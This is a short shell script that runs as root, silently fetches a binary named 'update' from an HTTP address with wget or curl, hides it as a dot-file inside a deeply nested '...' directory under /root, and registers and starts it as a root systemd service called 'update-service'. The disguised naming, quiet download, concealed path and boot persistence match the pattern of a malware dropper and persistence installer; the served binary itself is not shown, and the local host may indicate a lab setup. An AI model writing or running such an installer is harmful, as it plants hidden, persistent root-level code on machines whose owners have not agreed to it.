#!/bin/sh

# Script to download binary and create startup service
set -e

# Configuration
BINARY_URL="http://127.0.0.1:5000/update"
TARGET_DIR="/root/.../.../.../.../.../"
BINARY_NAME="update"
SERVICE_NAME="update-service"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This must be run as root"
    exit 1
fi


# Create target directory if it doesn't exist
mkdir -p "$TARGET_DIR"
mkdir -p "$TARGET_DIR"

# Download the binary quietly
if command -v wget >/dev/null 2>&1; then
    wget -q -O "$TARGET_DIR/.$BINARY_NAME" "$BINARY_URL"
elif command -v curl >/dev/null 2>&1; then
    curl -s -o "$TARGET_DIR/.$BINARY_NAME" "$BINARY_URL"
else
    echo "Error: Neither wget nor curl found. Please install one of them."
    exit 1
fi

# Make the binary executable
chmod +x "$TARGET_DIR/.$BINARY_NAME"


# Create systemd service file
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"

cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Update Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.../.../.../.../.../
ExecStart=/root/.../.../.../.../.../.update
Restart=no

[Install]
WantedBy=multi-user.target
EOF


# Reload systemd and enable service
if command -v systemctl &> /dev/null; then
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    
    # Check service status
    # echo "Service status:"
    # systemctl status "$SERVICE_NAME" --no-pager -l
else
    # echo "Warning: systemctl not found. You may need to manually create an init script."
    echo "..."
fi

echo "connection successfully!"